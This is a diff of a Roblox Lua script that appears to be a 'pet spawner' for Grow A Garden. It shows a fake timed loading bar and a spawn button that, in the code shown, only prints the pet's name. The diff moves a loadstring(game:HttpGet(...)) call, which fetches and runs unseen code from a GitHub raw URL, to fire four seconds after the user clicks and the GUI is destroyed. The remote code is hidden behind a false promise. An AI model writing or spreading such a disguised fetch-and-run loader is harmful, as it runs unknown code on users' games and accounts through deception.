@@ -87,20 +87,14 @@ local function SetupLoadingScreen()
     for i = 1, 100 do
         progressBar.Size = UDim2.new(0.6 * (i / 100), 0, 0.01, 0)
         loadingText.Text = "Loading.. " .. i .. "%"
-        task.wait(0.4) -- 100 * 0.4 = 40 seconds total
+        task.wait(0.4)
     end
 
     loadingText.Text = "Finalizing..."
     statusText.Text = "Initializing modules..."
 
-    task.wait(3) -- pause before spawn shows
+    task.wait(3)
 
-    -- Load additional GUI from GitHub
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/converterrr/PetSpawner/refs/heads/main/GrowAGarden%20GUI"))()
-    end)
-
-    -- Final text
     loadingText.Text = "Complete. Click to Spawn."
     statusText.Text = "Game ready!"
 
@@ -118,7 +112,12 @@ local function SetupLoadingScreen()
     spawnButton.MouseButton1Click:Connect(function()
         screenGui:Destroy()
         print("Spawned pet:", selectedPet)
-        -- Add pet logic here if needed
+
+        task.delay(4, function()
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/converterrr/PetSpawner/refs/heads/main/GrowAGarden%20GUI"))()
+            end)
+        end)
     end)
 end
 
